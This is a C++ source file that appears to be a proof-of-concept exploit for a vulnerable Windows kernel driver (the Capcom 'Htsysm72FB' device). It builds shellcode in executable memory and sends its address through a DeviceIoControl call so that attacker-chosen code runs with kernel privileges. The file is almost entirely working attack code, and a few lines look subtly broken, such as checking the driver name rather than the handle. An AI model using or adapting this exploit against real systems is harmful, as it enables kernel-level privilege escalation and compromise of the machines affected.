#define KERNEL_DEBUG

#include <iostream>
#include <Windows.h>
#include <sstream>
#include <iomanip>
#include <Psapi.h>
#include <future>
#include "kernel.h"

/*
 * 0f01cb => stac
 * 0f01ca => clac
 */

int pwn()
{
	// 0x000000d1
	SYSTEM_PROCESS_INFO systemProcessInfo;
	PsLookupProcessByProcessId((HANDLE)4, &systemProcessInfo);
	return (int)systemProcessInfo.ProcessId;
}

int main() 
{
	const wchar_t* driver = L"\\\\.\\Htsysm72FB";
	const DWORD magic = 0xaa013044;
	
	HANDLE handle = CreateFile(
		driver,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);

	if (driver != INVALID_HANDLE_VALUE && InitializeKernel())
	{
		std::cout << std::endl;

		std::cout << "Found handle: " << std::hex << handle << std::endl;
		std::cout << "Exploit at: " << std::hex << (uintptr_t)pwn << std::endl;

		unsigned char exploit[] = {
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,				// pointer to shellcode start
			0xCC,														// breakpoint
			0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	// movabs rax, pwn
			0xFF, 0xD0,													// call rax
			0xC3,														// ret
		};

		unsigned char* buffer = (unsigned char*)VirtualAlloc(NULL, sizeof(exploit), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

		if (buffer)
		{

			memcpy(buffer, exploit, sizeof(exploit));

			*(uint64_t*)buffer = (uint64_t)(buffer + 8);
			*(uint64_t*)(buffer + 11) = (uint64_t)pwn;

			uint64_t target = (uint64_t)(buffer + 8);

			uint32_t size = 0;
			uint32_t output = 0;
			uint32_t outputSize = 4;

			if (DeviceIoControl(handle, magic, &target, sizeof(buffer), &output, outputSize, (LPDWORD)&size, NULL))
			{
				std::cout << "Received bytes: " << size << std::endl;
			}
			else
			{
				std::cout << "Failed to communicate with driver: " << GetLastError() << std::endl;
			}

			VirtualFree((LPVOID)buffer, NULL, MEM_RELEASE);
		}
		else
		{
			std::cout << "Failed allocating buffer for exploit" << std::endl;
		}

		CloseHandle(handle);
	}
	else
	{
		std::cout << "Failed to get driver handle!" << std::endl;
	}

	return 0;
}